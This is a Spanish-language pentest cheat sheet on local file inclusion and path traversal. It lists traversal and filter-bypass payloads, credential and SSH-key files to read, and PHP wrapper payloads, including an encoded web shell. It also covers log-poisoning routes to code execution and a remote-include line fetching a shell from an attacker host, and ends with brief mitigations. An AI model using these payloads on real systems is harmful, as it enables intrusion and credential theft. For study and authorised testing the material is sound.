# LFI / Path Traversal / Arbitrary File Read

## Detección

Parámetros que apuntan a ficheros (`?file=`, `?page=`, `?view=`, `?lang=`,
`?img=`, `download=`). Prueba:

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd           (bypass de filtro que borra ../ una vez)
%2e%2e%2f...                     (URL-encode)
/etc/passwd                      (ruta absoluta)
```

En Windows: `..\..\..\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`.

## Ficheros de interés (Linux)

```
/etc/passwd                        usuarios
/etc/apache2/sites-available/000-default.conf   vhosts, rutas, .htpasswd
/etc/nginx/sites-enabled/default
/var/www/<app>/.htpasswd           hashes HTTP Basic (crackeables)
/home/<user>/.ssh/id_rsa           clave privada → SSH directo
/proc/self/environ                 variables de entorno
/var/log/apache2/access.log        log poisoning
<app>/config.php  .env  settings.py   credenciales de BD
```

> **Patrón recurrente:** leer el vhost config → descubrir `.htpasswd` →
> extraer hash Apache `$apr1$` → crackear → reutilizar como credencial SSH.

## PHP wrappers

```
php://filter/convert.base64-encode/resource=index.php    (leer código fuente)
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id
php://input   (con POST body = código)
```

Decodifica el source leído:

```bash
echo "BASE64" | base64 -d
```

## LFI → RCE

- **Log poisoning:** inyecta PHP en `User-Agent`, luego incluye `access.log`.
- **`/proc/self/environ`** (si incluible): inyecta vía User-Agent.
- **Session files:** `/var/lib/php/sessions/sess_<id>` si controlas datos de sesión.
- **Combinar con upload:** sube un JPG con PHP y hazle `include` con LFI.

## RFI (si `allow_url_include=On`)

```
?page=http://TU_IP/shell.txt
```

## Traversal en escritura (upload)

Si puedes controlar la ruta de destino de un upload, `../` permite **sobrescribir**
un archivo del servidor (handler/vista) → RCE. Encadena con
[04-file-upload.md](04-file-upload.md).

## Mitigación

`basename()`, allowlist de ficheros permitidos, `realpath()` + comprobar prefijo,
deshabilitar `allow_url_include`, no pasar entrada de usuario a funciones de fs.
